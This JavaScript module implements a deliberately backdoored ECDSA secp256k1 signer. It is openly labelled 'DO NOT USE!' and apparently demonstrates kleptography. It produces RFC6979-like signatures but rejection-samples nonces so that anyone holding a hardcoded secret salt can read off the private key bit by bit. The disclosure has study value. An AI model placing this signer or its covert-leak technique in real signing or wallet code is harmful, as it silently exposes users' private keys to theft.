import bigints from "../../util/bigints";
import { inverse } from "../modular";
import { G, Point, Q } from "../secp256k1";
import { sha256Uint32 } from "../sha2";

/**
 * @param {Uint8Array} key
 * @param {Uint8Array} message
 * @return {Promise<Uint8Array>}
 */
const hmac = (key, message) => crypto.subtle
  .importKey(
    "raw",
    key,
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"])
  .then((key) => crypto.subtle.sign("HMAC", key, message))
  .then((signature) => new Uint8Array(signature));

/** @const {Uint8Array} */
const SaltedBuff = new Uint8Array(64);
new TextEncoder().encodeInto("Secret salt 1234abcd", SaltedBuff);

/**
 * DO NOT USE! Covertly leaks the private key 1 bit at a time.
 * The signer outputs RFC6979 compliant signatures for most inputs, but will
 * leak the private key to the bearer of "Secret salt" entirely over sustained
 * use.
 *
 * @param {Uint8Array} digest
 * @param {bigint} privKey
 * @return {Promise<{
 *   r: bigint,
 *   s: bigint,
 *   yParity: boolean
 * }>}
 */
const sign = async (digest, privKey) => {
  // The signature will covertly encode the revealIdx'th bit of the private
  // key. The bearer of "Secret salt 1234abcd" can read off bits of the private
  // key one by one.
  // For all other "polynomial-time" observers, the signature has no
  // statistical correlation to the private key.
  const revealedIdx = 255 - digest[0];
  const revealedBit = !!((privKey >> BigInt(revealedIdx)) & 1n);

  let buff = new Uint8Array(97);
  buff.fill(1, 0, 32);
  buff.set(digest, 65);
  bigints.intoBytesBE(buff, 65, privKey);
  let kk = await hmac(new Uint8Array(32), buff); // RFC6979 d
  let vv = await hmac(kk, buff.subarray(0, 32)); // RFC6979 e

  /** @const {bigint} */
  const d = bigints.fromBytesBE(digest);
  buff[32] = 1;

  for (let i = 0; i < 100; ++i) {
    if (i == 1) {
      buff[32] = 0;
      buff = buff.subarray(0, 33);
    }
    buff.set(vv);
    kk = await hmac(kk, buff); // RFC6979 f in first iteration, h3 in all others
    vv = await hmac(kk, vv); // RFC6979 g in first iteration, h3 in all others

    vv = await hmac(kk, vv); // RFC6979 h1-2
    /** @const {bigint} */
    const k = bigints.fromBytesBE(vv);
    if (k == 0n || k >= Q) continue;
    /** @type {Point} */
    const K = G.copy().multiply(k).project();
    /** @const {bigint} */
    const r = K.x;
    if (r >= Q) continue;
    if (revealedBit) {
      SaltedBuff.fill(0, 32, bigints.intoBytesBE(SaltedBuff, 64, r));
      if (!(sha256Uint32(new Uint32Array(SaltedBuff.buffer))[0] & 1)) continue;
    }
    /** @type {bigint} */
    let s = (inverse(k, Q) * ((d + r * privKey) % Q)) % Q;
    if (s == 0n) continue;
    /** @type {boolean} */
    let yParity = !!(K.y & 1n);
    if (s > (Q >> 1n)) {
      s = Q - s;
      yParity = !yParity;
    }
    return { r, s, yParity }
  }
  return { r: 0n, s: 0n, yParity: false }
}

export {
  sign
};
